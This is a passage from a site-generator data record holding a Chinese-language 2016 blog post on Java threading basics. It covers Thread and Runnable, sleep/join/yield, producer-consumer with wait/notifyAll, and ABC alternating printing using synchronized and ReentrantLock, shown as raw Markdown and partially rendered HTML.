System.out.println(this.getName() + \"thread is started!\");\n        for (int i = 0; i < 50; i++ ) {\n            result += i;\n        }\n        System.out.println(this.getName() + \"thread is stopped!\");\n    }\n}\n\npublic class ThreadTest {\n\n    public static void main(String[] args) throws InterruptedException {\n\n        System.out.println(\"Main thread is started!\");\n        MyThread a = new MyThread(\"A\");\n        a.start();\n        a.join();\n        System.out.println(\"Main thread is stopped!\");\n    }\n\n}\n```\n输出结果:\n``` bash\nMain thread is started!\nAthread is started!\nAthread is stopped!\nMain thread is stopped!\n```\n\n- `yield()` : `运行`-->`可运行`,让当前运行线程回到可运行状态，以允许具有相同优先级的其他线程获得运行机会。因此，使用yield()的目的是让相同优先级的线程之间能适当的轮转执行。但是，实际中无法保证yield()达到让步目的，因为让步的线程还有可能被线程调度程序再次选中。\n\n``` java\nclass MyThread extends Thread\n{\n    public void run()\n    {\n        for (int i=0; i<5 ; i++)\n            System.out.println(Thread.currentThread().getName()\n                    + \" in control\");\n    }\n}\n\n// Driver Class\npublic class ThreadTest\n{\n    public static void main(String[]args)\n    {\n        MyThread t = new MyThread();\n        t.start();\n\n        for (int i=0; i<5; i++)\n        {\n            // Control passes to child thread\n            Thread.yield();\n\n            // After execution of child Thread\n            // main thread takes over\n            System.out.println(Thread.currentThread().getName()\n                    + \" in control\");\n        }\n    }\n}\n```\n可能的情况：\n- main运行时让掉CPU，过后main抢到CPU继续执行\n- main运行时让掉CPU，过后子线程抢到CPU继续执行\n\n所以输出可能是\n``` bash\nThread-0 in control\nmain in control\nmain in control\nmain in control\nmain in control\nmain in control\nThread-0 in control\nThread-0 in control\nThread-0 in control\nThread-0 in control\n```\n也可能是\n``` bash\nThread-0 in control\nThread-0 in control\nThread-0 in control\nThread-0 in control\nThread-0 in control\nmain in control\nmain in control\nmain in control\nmain in control\nmain in control\n```\n\n### 生产者消费者\n``` java\nimport java.util.LinkedList;\nimport java.util.Queue;\nimport java.util.Random;\n\npublic class ProducerCustomer {\n\n    public static void main(String args[]) {\n        System.out.println(\"Solving Producer Consumper Problem\");\n        Queue<Integer> buffer = new LinkedList<>();\n        int maxSize = 10;\n        Thread producer = new Producer(buffer, maxSize, \"PRODUCER\");\n        Thread consumer = new Consumer(buffer, maxSize, \"CONSUMER\");\n        producer.start(); consumer.start();\n    }\n}\n\nclass Producer extends Thread {\n    private Queue<Integer> queue;\n    private int maxSize;\n    public Producer(Queue<Integer> queue, int maxSize, String name) {\n        super(name);\n        this.queue = queue;\n        this.maxSize = maxSize;\n    }\n    @Override public void run()\n    {\n        while (true)\n        {\n            synchronized (queue) {\n                while (queue.size() == maxSize) {\n                    try {\n                        System.out .println(\"Queue is full, \" + \"Producer thread waiting for \" + \"consumer to take something from queue\");\n                        queue.wait();\n                    } catch (Exception ex) {\n                        ex.printStackTrace(); }\n                }\n                Random random = new Random();\n                int i = random.nextInt();\n                System.out.println(\"Producing value : \" + i);\n                queue.add(i);\n                queue.notifyAll();\n            }\n        }\n    }\n}\n\nclass Consumer extends Thread {\n    private Queue<Integer> queue;\n    private int maxSize;\n    public Consumer(Queue<Integer> queue, int maxSize, String name){\n        super(name);\n        this.queue = queue;\n        this.maxSize = maxSize;\n    }\n    @Override public void run() {\n        while (true) {\n            synchronized (queue) {\n                while (queue.isEmpty()) {\n                    System.out.println(\"Queue is empty,\" + \"Consumer thread is waiting\" + \" for producer thread to put something in queue\");\n                    try {\n                        queue.wait();\n                    } catch (Exception ex) {\n                        ex.printStackTrace();\n                    }\n                }\n                System.out.println(\"Consuming value : \" + queue.remove());\n                queue.notifyAll();\n            }\n        }\n    }\n}\n```\n\n### ABC交替打印\n#### synchronized方式\n``` java\npublic class ABC_Synch {\n    public static class ThreadPrinter implements Runnable {\n        private String name;\n        private Object prev;\n        private Object self;\n\n        private ThreadPrinter(String name, Object prev, Object self) {\n            this.name = name;\n            this.prev = prev;\n            this.self = self;\n        }\n\n        @Override\n        public void run() {\n            int count = 10;\n            while (count > 0) {// 多线程并发，不能用if，必须使用whil循环\n                synchronized (prev) { // 先获取 prev 锁\n                    synchronized (self) {// 再获取 self 锁\n                        System.out.print(name);// 打印\n                        count--;\n\n                        self.notifyAll();// 唤醒其他线程竞争self锁，注意此时self锁并未立即释放。\n                    }\n                    // 此时执行完self的同步块，这时self锁才释放。\n                    try {\n                        if (count == 0) {// 如果count==0,表示这是最后一次打印操作，通过notifyAll操作释放对象锁。\n                            prev.notifyAll();\n                        } else {\n                            prev.wait(); // 立即释放 prev锁，当前线程休眠，等待唤醒\n                        }\n                    } catch (InterruptedException e) {\n                        e.printStackTrace();\n                    }\n                }\n            }\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        Object a = new Object();\n        Object b = new Object();\n        Object c = new Object();\n        ThreadPrinter pa = new ThreadPrinter(\"A\", c, a);\n        ThreadPrinter pb = new ThreadPrinter(\"B\", a, b);\n        ThreadPrinter pc = new ThreadPrinter(\"C\", b, c);\n\n        new Thread(pa).start();\n        Thread.sleep(10);// 保证初始ABC的启动顺序\n        new Thread(pb).start();\n        Thread.sleep(10);\n        new Thread(pc).start();\n        Thread.sleep(10);\n    }\n}\n```\n\n由交替打印代码可以得出`wait()`和`notify()`的区别\n- wait() 与 notify/notifyAll() 是Object类的方法，在执行两个方法时，要先获得锁。\n- 当线程执行wait()时，会把当前的锁释放，然后让出CPU，进入等待状态。\n- 当执行notify/notifyAll方法时，会唤醒一个处于等待该 对象锁 的线程，然后继续往下执行，直到执行完退出对象锁锁住的区域（synchronized修饰的代码块）后再释放锁。\n\n**`notify/notifyAll()`执行后，并不立即释放锁，而是要等到执行完临界区中代码后，再释放。**\n\n#### lock方式\n``` java\nimport java.util.concurrent.locks.Lock;\nimport java.util.concurrent.locks.ReentrantLock;\n\npublic class ABC_Lock {\n    private static Lock lock = new ReentrantLock();\n    private static int state = 0;\n\n    static class ThreadA extends Thread {\n        @Override\n        public void run() {\n            for (int i = 0; i < 10; ) {\n                try {\n                    lock.lock();\n                    while (state % 3 == 0) {\n                        System.out.print(\"A\");\n                        state++;\n                        i++;\n                    }\n                } finally {\n                    lock.unlock();\t// 必须放在finally中\n                }\n            }\n        }\n    }\n\n    static class ThreadB extends Thread {\n        @Override\n        public void run() {\n            for (int i = 0; i < 10; ) {\n                try {\n                    lock.lock();\n                    while (state % 3 == 1) {\n                        System.out.print(\"B\");\n                        state++;\n                        i++;\n                    }\n                } finally {\n                    lock.unlock();\n                }\n            }\n        }\n    }\n\n    static class ThreadC extends Thread {\n        @Override\n        public void run() {\n            for (int i = 0; i < 10; ) {\n                try {\n                    lock.lock();\n                    while (state % 3 == 2) {\n                        System.out.print(\"C\");\n                        state++;\n                        i++;\n                    }\n                } finally {\n                    lock.unlock();\n                }\n            }\n        }\n    }\n\n    public static void main(String[] args) {\n        new ThreadA().start();\n        new ThreadB().start();\n        new ThreadC().start();\n    }\n}\n```\n\n#### synchronized 和 lock的区别\n- `synchronized` : 在资源竞争不是很激烈的情况下，偶尔会有同步的情形下，synchronized是很合适的。原因在于，编译程序通常会尽可能的进行优化synchronize，另外可读性非常好，不管用没用过5.0多线程包的程序员都能理解。\n- `lock(ReentrantLock)` : 提供了多样化的同步，比如有时间限制的同步，可以被Interrupt的同步（synchronized的同步是不能Interrupt的）等。在资源竞争不激烈的情形下，性能稍微比synchronized差点点。但是当同步非常激烈的时候，synchronized的性能一下子能下降好几十倍。而ReentrantLock确还能维持常态。\n\n我们写同步的时候，优先考虑synchronized，如果有特殊需要，再进一步优化。ReentrantLock如果用的不好，不仅不能提高性能，还可能带来灾难。","source":"_posts/java-Thread.md","raw":"---\ntitle: java线程学习记录\ntags: 线程\ndate: 2016-06-18 15:18:23\ncategories: Java\n---\n\n**在接触Android时候发现java基础没打好，所以回来重新打基础**\n\n### java线程基础\n\n<!--more-->\n\n**java线程是在一个程序代码中CPU同步运行多个程序片段，而不是一行代码一行代码地执行到底，这样做是为了在运行大程序时提高程序的运行效率。虽然说的是同步运行，其实是“微观串行，宏观并行”，只是线程之间的切换时间太短以至于我们看上去是并行的。另外线程的调度模式有    （1）分时模型   （2）抢占模型**\n**java用的是抢占模型，其他知识以后再补充，现在放代码**\n\n> 重要提示：以下的代码的运行结果可能并不能代表多线程真正的运行顺序，因为本身线程运行时输出信号到显示器这段时间也是不可预计的，所以显示器上的显示顺序不完全代表运行代码时间先后。这个问题叫做`显示调度器不可预测`\n\n**1. 继承`Thread`类，重写`run`函数**\n``` java\n\nclass ThreadTest {\n\tpublic static void main (String[] args){\n\t\tMyThread thread1 = new MyThread(\"thread1\");\n\t\tMyThread thread2 = new MyThread(\"thread2\");\n\t\tthread1.start();\n\t\tthread2.start();\n\t\tSystem.out.println(\"The main runnnig is stopped\");\n\t}\n}\n\nclass MyThread extends Thread {\n\tpublic MyThread(String str){\n\t\tsuper(str);\n\t}\n\tpublic void run(){\n\t\tfor (int i=0;i<3;i++){\n\t\t\tSystem.out.println(getName() + \"is running\");\n\t\t\ttry {\n\t\t\t\tsleep(100);\n\t\t\t} catch (InterruptedException e) {}\n\t\t}\n\t\tSystem.out.println(getName() + \"stopped\");\n\t}\n}\n\n```\n\n**运行结果如下**\n``` bash\nThe main runnnig is stopped\nthread2is running\nthread1is running\nthread1is running\nthread2is running\nthread1is running\nthread2is running\nthread2stopped\nthread1stopped\n```\n\n**2. 实现`Runable`接口**\n\n``` java\nclass TestSync implements Runnable {\n\n    private int balance;\n\n    @Override\n    public void run() {\n        for(int i = 0; i < 50; i++) {\n            increament();\n            System.out.println(\"balance is \" + balance);\n        }\n    }\n\n    private void increament() {\n        int i = balance;\n        balance = i + 1;\n    }\n}\n\npublic class TestSyncTest {\n\n    public static void main(String[] args) {\n        TestSync job = new TestSync();\n        Thread a = new Thread(job);\n        Thread b = new Thread(job);\n        a.start();\n        b.start();\n    }\n}\n```\n\n### 线程调度函数及代码实例\n- `sleep(long millis)` : 在指定的毫秒数内让当前正在执行的线程休眠（暂停执行）\n- `join()` : 在很多情况下，主线程生成并起动了子线程，如果子线程里要进行大量的耗时的运算，主线程往往将于子线程之前结束，但是如果主线程处理完其他的事务后，需要用到子线程的处理结果，也就是主线程需要等待子线程执行完成之后再结束，这个时候就要用到join()方法了。\n\n``` java\nclass MyThread extends Thread {\n    public MyThread(String name) {\n        super(name);\n    }\n\n    public void run() {\n        int result = 0;\n        System.out.println(this.getName() + \"thread is started!\");\n        for (int i = 0; i < 50; i++ ) {\n            result += i;\n        }\n        System.out.println(this.getName() + \"thread is stopped!\");\n    }\n}\n\npublic class ThreadTest {\n\n    public static void main(String[] args) throws InterruptedException {\n\n        System.out.println(\"Main thread is started!\");\n        MyThread a = new MyThread(\"A\");\n        a.start();\n        a.join();\n        System.out.println(\"Main thread is stopped!\");\n    }\n\n}\n```\n输出结果:\n``` bash\nMain thread is started!\nAthread is started!\nAthread is stopped!\nMain thread is stopped!\n```\n\n- `yield()` : `运行`-->`可运行`,让当前运行线程回到可运行状态，以允许具有相同优先级的其他线程获得运行机会。因此，使用yield()的目的是让相同优先级的线程之间能适当的轮转执行。但是，实际中无法保证yield()达到让步目的，因为让步的线程还有可能被线程调度程序再次选中。\n\n``` java\nclass MyThread extends Thread\n{\n    public void run()\n    {\n        for (int i=0; i<5 ; i++)\n            System.out.println(Thread.currentThread().getName()\n                    + \" in control\");\n    }\n}\n\n// Driver Class\npublic class ThreadTest\n{\n    public static void main(String[]args)\n    {\n        MyThread t = new MyThread();\n        t.start();\n\n        for (int i=0; i<5; i++)\n        {\n            // Control passes to child thread\n            Thread.yield();\n\n            // After execution of child Thread\n            // main thread takes over\n            System.out.println(Thread.currentThread().getName()\n                    + \" in control\");\n        }\n    }\n}\n```\n可能的情况：\n- main运行时让掉CPU，过后main抢到CPU继续执行\n- main运行时让掉CPU，过后子线程抢到CPU继续执行\n\n所以输出可能是\n``` bash\nThread-0 in control\nmain in control\nmain in control\nmain in control\nmain in control\nmain in control\nThread-0 in control\nThread-0 in control\nThread-0 in control\nThread-0 in control\n```\n也可能是\n``` bash\nThread-0 in control\nThread-0 in control\nThread-0 in control\nThread-0 in control\nThread-0 in control\nmain in control\nmain in control\nmain in control\nmain in control\nmain in control\n```\n\n### 生产者消费者\n``` java\nimport java.util.LinkedList;\nimport java.util.Queue;\nimport java.util.Random;\n\npublic class ProducerCustomer {\n\n    public static void main(String args[]) {\n        System.out.println(\"Solving Producer Consumper Problem\");\n        Queue<Integer> buffer = new LinkedList<>();\n        int maxSize = 10;\n        Thread producer = new Producer(buffer, maxSize, \"PRODUCER\");\n        Thread consumer = new Consumer(buffer, maxSize, \"CONSUMER\");\n        producer.start(); consumer.start();\n    }\n}\n\nclass Producer extends Thread {\n    private Queue<Integer> queue;\n    private int maxSize;\n    public Producer(Queue<Integer> queue, int maxSize, String name) {\n        super(name);\n        this.queue = queue;\n        this.maxSize = maxSize;\n    }\n    @Override public void run()\n    {\n        while (true)\n        {\n            synchronized (queue) {\n                while (queue.size() == maxSize) {\n                    try {\n                        System.out .println(\"Queue is full, \" + \"Producer thread waiting for \" + \"consumer to take something from queue\");\n                        queue.wait();\n                    } catch (Exception ex) {\n                        ex.printStackTrace(); }\n                }\n                Random random = new Random();\n                int i = random.nextInt();\n                System.out.println(\"Producing value : \" + i);\n                queue.add(i);\n                queue.notifyAll();\n            }\n        }\n    }\n}\n\nclass Consumer extends Thread {\n    private Queue<Integer> queue;\n    private int maxSize;\n    public Consumer(Queue<Integer> queue, int maxSize, String name){\n        super(name);\n        this.queue = queue;\n        this.maxSize = maxSize;\n    }\n    @Override public void run() {\n        while (true) {\n            synchronized (queue) {\n                while (queue.isEmpty()) {\n                    System.out.println(\"Queue is empty,\" + \"Consumer thread is waiting\" + \" for producer thread to put something in queue\");\n                    try {\n                        queue.wait();\n                    } catch (Exception ex) {\n                        ex.printStackTrace();\n                    }\n                }\n                System.out.println(\"Consuming value : \" + queue.remove());\n                queue.notifyAll();\n            }\n        }\n    }\n}\n```\n\n### ABC交替打印\n#### synchronized方式\n``` java\npublic class ABC_Synch {\n    public static class ThreadPrinter implements Runnable {\n        private String name;\n        private Object prev;\n        private Object self;\n\n        private ThreadPrinter(String name, Object prev, Object self) {\n            this.name = name;\n            this.prev = prev;\n            this.self = self;\n        }\n\n        @Override\n        public void run() {\n            int count = 10;\n            while (count > 0) {// 多线程并发，不能用if，必须使用whil循环\n                synchronized (prev) { // 先获取 prev 锁\n                    synchronized (self) {// 再获取 self 锁\n                        System.out.print(name);// 打印\n                        count--;\n\n                        self.notifyAll();// 唤醒其他线程竞争self锁，注意此时self锁并未立即释放。\n                    }\n                    // 此时执行完self的同步块，这时self锁才释放。\n                    try {\n                        if (count == 0) {// 如果count==0,表示这是最后一次打印操作，通过notifyAll操作释放对象锁。\n                            prev.notifyAll();\n                        } else {\n                            prev.wait(); // 立即释放 prev锁，当前线程休眠，等待唤醒\n                        }\n                    } catch (InterruptedException e) {\n                        e.printStackTrace();\n                    }\n                }\n            }\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        Object a = new Object();\n        Object b = new Object();\n        Object c = new Object();\n        ThreadPrinter pa = new ThreadPrinter(\"A\", c, a);\n        ThreadPrinter pb = new ThreadPrinter(\"B\", a, b);\n        ThreadPrinter pc = new ThreadPrinter(\"C\", b, c);\n\n        new Thread(pa).start();\n        Thread.sleep(10);// 保证初始ABC的启动顺序\n        new Thread(pb).start();\n        Thread.sleep(10);\n        new Thread(pc).start();\n        Thread.sleep(10);\n    }\n}\n```\n\n由交替打印代码可以得出`wait()`和`notify()`的区别\n- wait() 与 notify/notifyAll() 是Object类的方法，在执行两个方法时，要先获得锁。\n- 当线程执行wait()时，会把当前的锁释放，然后让出CPU，进入等待状态。\n- 当执行notify/notifyAll方法时，会唤醒一个处于等待该 对象锁 的线程，然后继续往下执行，直到执行完退出对象锁锁住的区域（synchronized修饰的代码块）后再释放锁。\n\n**`notify/notifyAll()`执行后，并不立即释放锁，而是要等到执行完临界区中代码后，再释放。**\n\n#### lock方式\n``` java\nimport java.util.concurrent.locks.Lock;\nimport java.util.concurrent.locks.ReentrantLock;\n\npublic class ABC_Lock {\n    private static Lock lock = new ReentrantLock();\n    private static int state = 0;\n\n    static class ThreadA extends Thread {\n        @Override\n        public void run() {\n            for (int i = 0; i < 10; ) {\n                try {\n                    lock.lock();\n                    while (state % 3 == 0) {\n                        System.out.print(\"A\");\n                        state++;\n                        i++;\n                    }\n                } finally {\n                    lock.unlock();\t// 必须放在finally中\n                }\n            }\n        }\n    }\n\n    static class ThreadB extends Thread {\n        @Override\n        public void run() {\n            for (int i = 0; i < 10; ) {\n                try {\n                    lock.lock();\n                    while (state % 3 == 1) {\n                        System.out.print(\"B\");\n                        state++;\n                        i++;\n                    }\n                } finally {\n                    lock.unlock();\n                }\n            }\n        }\n    }\n\n    static class ThreadC extends Thread {\n        @Override\n        public void run() {\n            for (int i = 0; i < 10; ) {\n                try {\n                    lock.lock();\n                    while (state % 3 == 2) {\n                        System.out.print(\"C\");\n                        state++;\n                        i++;\n                    }\n                } finally {\n                    lock.unlock();\n                }\n            }\n        }\n    }\n\n    public static void main(String[] args) {\n        new ThreadA().start();\n        new ThreadB().start();\n        new ThreadC().start();\n    }\n}\n```\n\n#### synchronized 和 lock的区别\n- `synchronized` : 在资源竞争不是很激烈的情况下，偶尔会有同步的情形下，synchronized是很合适的。原因在于，编译程序通常会尽可能的进行优化synchronize，另外可读性非常好，不管用没用过5.0多线程包的程序员都能理解。\n- `lock(ReentrantLock)` : 提供了多样化的同步，比如有时间限制的同步，可以被Interrupt的同步（synchronized的同步是不能Interrupt的）等。在资源竞争不激烈的情形下，性能稍微比synchronized差点点。但是当同步非常激烈的时候，synchronized的性能一下子能下降好几十倍。而ReentrantLock确还能维持常态。\n\n我们写同步的时候，优先考虑synchronized，如果有特殊需要，再进一步优化。ReentrantLock如果用的不好，不仅不能提高性能，还可能带来灾难。","slug":"java-Thread","published":1,"updated":"2018-03-09T08:25:22.941Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgrjscz70028yp0lo6by47d5","content":"<p><strong>在接触Android时候发现java基础没打好，所以回来重新打基础</strong></p>\n<h3 id=\"java线程基础\"><a href=\"#java线程基础\" class=\"headerlink\" title=\"java线程基础\"></a>java线程基础</h3><a id=\"more\"></a>\n<p><strong>java线程是在一个程序代码中CPU同步运行多个程序片段，而不是一行代码一行代码地执行到底，这样做是为了在运行大程序时提高程序的运行效率。虽然说的是同步运行，其实是“微观串行，宏观并行”，只是线程之间的切换时间太短以至于我们看上去是并行的。另外线程的调度模式有    （1）分时模型   （2）抢占模型</strong><br><strong>java用的是抢占模型，其他知识以后再补充，现在放代码</strong></p>\n<blockquote>\n<p>重要提示：以下的代码的运行结果可能并不能代表多线程真正的运行顺序，因为本身线程运行时输出信号到显示器这段时间也是不可预计的，所以显示器上的显示顺序不完全代表运行代码时间先后。这个问题叫做<code>显示调度器不可预测</code></p>\n</blockquote>\n<p><strong>1. 继承<code>Thread</code>类，重写<code>run</code>函数</strong><br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ThreadTest</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span> <span class=\"params\">(String[] args)</span></span>&#123;</span><br><span class=\"line\">\t\tMyThread thread1 = <span class=\"keyword\">new</span> MyThread(<span class=\"string\">\"thread1\"</span>);</span><br><span class=\"line\">\t\tMyThread thread2 = <span class=\"keyword\">new</span> MyThread(<span class=\"string\">\"thread2\"</span>);</span><br><span class=\"line\">\t\tthread1.start();</span><br><span class=\"line\">\t\tthread2.start();</span><br><span class=\"line\">\t\tSystem.out.println(<span class=\"string\">\"The main runnnig is stopped\"</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MyThread</span> <span class=\"keyword\">extends</span> <span class=\"title\">Thread</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">MyThread</span><span class=\"params\">(String str)</span></span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">super</span>(str);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">3</span>;i++)&#123;</span><br><span class=\"line\">\t\t\tSystem.out.println(getName() + <span class=\"string\">\"is running\"</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">\t\t\t\tsleep(<span class=\"number\">100</span>);</span><br><span class=\"line\">\t\t\t&#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tSystem.out.println(getName() + <span class=\"string\">\"stopped\"</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><strong>运行结果如下</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">The main runnnig is stopped</span><br><span class=\"line\">thread2is running</span><br><span class=\"line\">thread1is running</span><br><span class=\"line\">thread1is running</span><br><span class=\"line\">thread2is running</span><br><span class=\"line\">thread1is running</span><br><span class=\"line\">thread2is running</span><br><span class=\"line\">thread2stopped</span><br><span class=\"line\">thread1stopped</span><br></pre></td></tr></table></figure></p>\n<p><strong>2. 实现<code>Runable</code>接口</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TestSync</span> <span class=\"keyword\">implements</span> <span class=\"title\">Runnable</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> balance;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">50</span>; i++) &#123;</span><br><span class=\"line\">            increament();</span><br><span class=\"line\">            System.out.println(<span class=\"string\">\"balance is \"</span> + balance);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">increament</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> i = balance;</span><br><span class=\"line\">        balance = i + <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TestSyncTest</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        TestSync job = <span class=\"keyword\">new</span> TestSync();</span><br><span class=\"line\">        Thread a = <span class=\"keyword\">new</span> Thread(job);</span><br><span class=\"line\">        Thread b = <span class=\"keyword\">new</span> Thread(job);</span><br><span class=\"line\">        a.start();</span><br><span class=\"line\">        b.start();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"线程调度函数及代码实例\"><a href=\"#线程调度函数及代码实例\" class=\"headerlink\" title=\"线程调度函数及代码实例\"></a>线程调度函数及代码实例</h3><ul>\n<li><code>sleep(long millis)</code> : 在指定的毫秒数内让当前正在执行的线程休眠（暂停执行）</li>\n<li><code>join()</code> : 在很多情况下，主线程生成并起动了子线程，如果子线程里要进行大量的耗时的运算，主线程往往将于子线程之前结束，但是如果主线程处理完其他的事务后，需要用到子线程的处理结果，也就是主线程需要等待子线程执行完成之后再结束，这个时候就要用到join()方法了。</li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MyThread</span> <span class=\"keyword\">extends</span> <span class=\"title\">Thread</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">MyThread</span><span class=\"params\">(String name)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>(name);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> result = <span class=\"number\">0</span>;</span><br><span class=\"line\">        System.out.println(<span class=\"keyword\">this</span>.getName() + <span class=\"string\">\"thread is started!\"</span>);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">50</span>; i++ ) &#123;</span><br><span class=\"line\">            result += i;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        System.out.println(<span class=\"keyword\">this</span>.getName() + <span class=\"string\">\"thread is stopped!\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ThreadTest</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> InterruptedException </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"Main thread is started!\"</span>);</span><br><span class=\"line\">        MyThread a = <span class=\"keyword\">new</span> MyThread(<span class=\"string\">\"A\"</span>);</span><br><span class=\"line\">        a.start();</span><br><span class=\"line\">        a.join();</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"Main thread is stopped!\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>输出结果:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span 